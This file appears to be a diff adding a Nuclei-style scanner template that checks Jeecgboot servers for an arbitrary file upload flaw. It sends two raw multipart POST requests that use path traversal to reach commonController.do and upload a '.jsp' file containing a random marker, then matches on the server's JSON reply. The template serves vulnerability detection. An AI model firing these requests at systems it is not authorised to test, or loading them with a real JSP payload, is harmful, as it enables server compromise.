@@ -1,0 +1,50 @@
+id: jeecgboot-commoncontroller-do-file-upload
+info:
+  name: Jeecgboot CommonController File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Arbitrary file upload vulnerability in Jeecgboot's commonController.do endpoint.
+
+variables:
+  t1: '{{rand_base(8)}}'
+
+http:
+  - raw:
+      - |
+        POST /api/../commonController.do?parserXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{t1}}
+
+        ------WebKitFormBoundary{{t1}}
+        Content-Disposition: form-data; name="file"; filename="1234.jsp"
+        Content-Type: application/octet-stream
+
+        {{t1}}
+        ------WebKitFormBoundary{{t1}}--
+
+      - |
+        POST /scheduler/api/../commonController.do?parserXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{t1}}
+
+        ------WebKitFormBoundary{{t1}}
+        Content-Disposition: form-data; name="file"; filename="1234.jsp"
+        Content-Type: application/octet-stream
+
+        {{t1}}
+        ------WebKitFormBoundary{{t1}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "attributes"
+          - "obj"
+          - "success"
+          - "jsonStr"
